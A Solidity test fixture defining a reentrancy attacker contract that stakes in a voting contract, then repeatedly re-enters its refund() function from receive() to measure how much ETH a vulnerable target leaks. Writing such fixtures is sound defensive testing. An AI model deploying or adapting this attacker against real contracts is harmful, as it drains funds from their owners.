// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

/// @dev The minimal surface the attacker needs from any refund target.
///
///      `vote` takes a set rather than a single id, matching the real `Poll`.
///      The signature has to track the contract under test: an attacker that
///      called the old single-id selector would no longer reach the function at
///      all, so the reentrancy tests would pass by failing to call anything.
interface IRefundTarget {
    function vote(uint256[] calldata optionIds) external payable;
    function refund() external;
}

/// @dev TEST FIXTURE ONLY — this contract must never be deployed.
///
/// A reentrancy attacker that stakes legitimately, waits for the ballot to
/// close, then re-enters `refund()` from inside its own `receive()`.
///
/// The re-entry is wrapped in try/catch on purpose. A naive attacker that lets
/// the inner revert bubble up would simply revert the whole transaction, which
/// proves nothing: the point is to show how much value a tolerant attacker can
/// extract when the target is vulnerable.
contract RefundAttacker {
    IRefundTarget public immutable target;

    /// @notice Upper bound on re-entry attempts, so a bug cannot loop forever.
    uint256 public immutable maxReentries;

    /// @notice How many times `receive()` attempted to re-enter.
    uint256 public reentryAttempts;

    /// @notice Total ETH received from the target, including the outer refund.
    uint256 public totalReceived;

    constructor(address target_, uint256 maxReentries_) {
        target = IRefundTarget(target_);
        maxReentries = maxReentries_;
    }

    /// @notice Stake and vote through the target, so this contract owns a stake.
    function castVote(uint256[] calldata optionIds) external payable {
        target.vote{ value: msg.value }(optionIds);
    }

    /// @notice Trigger the refund that starts the reentrancy cascade.
    function attack() external {
        target.refund();
    }

    receive() external payable {
        totalReceived += msg.value;

        if (reentryAttempts >= maxReentries) return;
        if (address(target).balance == 0) return;

        ++reentryAttempts;
        try target.refund() {} catch {}
    }
}
